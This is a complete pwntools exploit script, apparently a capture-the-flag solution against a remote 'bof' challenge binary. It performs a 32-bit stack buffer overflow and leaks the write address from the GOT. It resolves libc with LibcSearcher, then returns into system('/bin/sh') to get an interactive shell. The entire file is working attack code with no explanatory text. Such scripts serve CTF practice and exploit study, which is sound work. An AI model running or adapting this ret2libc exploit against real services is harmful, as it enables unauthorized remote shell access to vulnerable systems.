# coding:utf-8

from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
 
proc_name = 'bof'
#p = process(proc_name)
p = remote('node3.buuoj.cn', 29932)
elf = ELF(proc_name)
 
padding = 'a' * 0x6C
fake_ebp = 'jkjk'
write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']

payload = padding + fake_ebp + p32(write_plt) +p32(main_addr) + p32(1) + p32(write_got) + p32(4)
 
p.sendline(payload)
 
write_addr = u32(p.recvuntil('\xf7')[-4:])
 
print('write_addr: ', hex(write_addr))

libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')
 
payload = padding + fake_ebp + p32(system_addr) + fake_ebp + p32(str_bin_sh)
 
p.sendline(payload)
p.interactive()
 
